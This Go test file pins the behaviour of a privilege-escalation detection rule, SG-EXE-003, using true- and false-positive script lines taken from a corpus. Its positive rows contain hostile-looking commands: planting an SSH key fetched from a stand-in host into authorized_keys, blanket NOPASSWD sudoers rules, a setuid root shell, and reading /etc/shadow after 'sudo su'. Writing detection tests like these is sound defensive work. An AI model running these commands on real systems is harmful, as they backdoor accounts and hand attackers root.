package rules

import "testing"

// TestPrivEscSeparatesAcquiringPrivilegeFromUsingIt is the rule-polish pin for
// SG-EXE-003. The rule used to carry a bare `^\s*sudo\s+\w` leaf, and measured
// over 1,036 corpus bundles that leaf produced 34 of the rule's 37 findings and
// not one true positive: every hit was an installer doing ordinary privileged
// work. The corpus's one real privilege *grant* — a NOPASSWD sudoers rule
// written with `sudo tee` — was missed, while 21 findings landed on the lines
// around it.
//
// So the axis this test pins is not "does sudo appear" but "does the caller end
// up holding privilege it did not hold before". Every `false` row below is a
// verbatim line from the corpus that used to be a finding.
func TestPrivEscSeparatesAcquiringPrivilegeFromUsingIt(t *testing.T) {
	r := ruleByID(t, "SG-EXE-003")
	cases := []struct {
		name string
		text string
		want bool
	}{
		// --- recall: the grant written the way real scripts write it ---
		// The corpus miss. A `>` redirect cannot create a root-owned file
		// (the shell opens it as the unprivileged user), so `| sudo tee` is
		// the form install guides actually use — and the only form the rule
		// could not see.
		{"sudoers written via sudo tee", `cat <<SUDOERS | sudo tee "/etc/sudoers.d/$DB2USER_NAME" >/dev/null
$DB2USER_NAME ALL=(ALL) NOPASSWD: /opt/ibm/db2/bin/*
SUDOERS
`, true},
		{"authorized_keys appended via tee -a", "curl -s https://x.example/k.pub | tee -a ~/.ssh/authorized_keys\n", true},
		{"sudoers rule granting blanket NOPASSWD", "svc ALL=(ALL) NOPASSWD: ALL\n", true},
		{"account joined to an admin group", "usermod -aG sudo deployer\n", true},
		{"account joined to wheel", "sudo usermod -a -G wheel svcacct\n", true},
		{"escalation to an interactive root shell", "#!/bin/bash\nsudo -i\nwhoami\n", true},
		{"sudo su with no target user", "sudo su\ncat /etc/shadow\n", true},
		{"su - at end of line", "su -\n", true},
		{"pkexec with an argument", "pkexec /tmp/stage2.sh\n", true},
		{"doas with an argument", "doas cp /tmp/p /usr/local/bin/p\n", true},
		{"visudo invoked directly", "sudo visudo -f /etc/sudoers.d/agent\n", true},

		// --- recall preserved: what the rule already caught ---
		{"classic authorized_keys append", `echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys`, true},
		{"redirect into /etc/sudoers", `echo "agent ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers`, true},
		{"setuid bit", "chmod u+s /tmp/rootshell\n", true},
		{"file capabilities", "setcap cap_setuid+ep /tmp/helper\n", true},

		// --- precision: verbatim corpus lines that used to be findings ---
		// aws/rds-db2 (21 findings) — a vendor DB2 installer. Privileged
		// *use*, in the AWS regression anchor.
		{"fp: sudo package install", "sudo yum install -y libxcrypt-compat &>/dev/null\n", false},
		{"fp: sudo mv into /usr/local/bin", `sudo mv -f "$tmp_jq" /usr/local/bin/jq`, false},
		{"fp: sudo chmod +x", "sudo chmod +x /usr/local/bin/jq\n", false},
		{"fp: sudo chown", `sudo chown "$DB2USER_NAME:$DB2USER_NAME" "/home/$DB2USER_NAME/README"`, false},
		{"fp: sudo useradd", `sudo useradd -u "$uid" -g "$gid" -d "/home/$username" -m -s /bin/bash "$username"`, false},
		{"fp: sudo mount", "sudo mount --bind /var/tmp /tmp\n", false},
		{"fp: sudo bash -c", `sudo bash -c "db2ls -c"`, false},
		{"fp: sudo rm", `sudo rm -rf "/home/$DB2USER_NAME/sqllib" &>/dev/null || true`, false},
		// The chmod that hardens the sudoers file is itself only a mode
		// change; the grant on the line above it is what leaf (2) catches.
		{"fp: sudo chmod 440 on the sudoers file", `sudo chmod 440 "/etc/sudoers.d/$DB2USER_NAME"`, false},
		// clawhub/computer-use (13 findings) — VNC desktop setup.
		{"fp: sudo apt install", "sudo apt install -y xvfb xfce4 x11vnc novnc websockify\n", false},
		{"fp: sudo systemctl start", "sudo systemctl start x11vnc\n", false},
		{"fp: sudo systemctl enable", "sudo systemctl enable xvfb xfce-minimal x11vnc novnc\n", false},
		{"fp: sudo mkdir", "sudo mkdir -p /opt/computer-use\n", false},

		// --- precision: near-misses the new leaves must not swallow ---
		// A comment disclaiming the grant is not the grant. Anchoring leaf
		// (3) on the `ALL=(...)` runas spec is what keeps this out.
		{"prose disclaiming NOPASSWD", "  # needs post-install (least privilege) — not blanket NOPASSWD:ALL.\n", false},
		// Switching to a service account is not a privilege gain.
		{"sudo su to a named service account", "sudo su - db2inst1\n", false},
		// A bare identifier is not a command. A vendored meson helper does
		// exactly this, and `\bpkexec\b` flagged it eight times.
		{"pkexec as a Python identifier", "            pkexec = shutil.which('pkexec')\n", false},
		{"pkexec read in a condition", "            if rootcmd is None and pkexec is not None:\n", false},
		// -S reads the password from stdin; it escalates nothing, and is why
		// leaf (6) is case-sensitive.
		{"sudo -S is not a root shell", "echo \"$PW\" | sudo -S apt-get update\n", false},
		// Group membership that is not an administrative group.
		{"usermod into a non-admin group", "usermod -aG docker builder\n", false},
		// An ordinary tee has nothing to do with privilege.
		{"tee to an ordinary path", "make 2>&1 | tee /tmp/build.log\n", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := len(r.Evaluate("scripts", c.text)) > 0; got != c.want {
				t.Errorf("match=%v, want %v", got, c.want)
			}
		})
	}
}
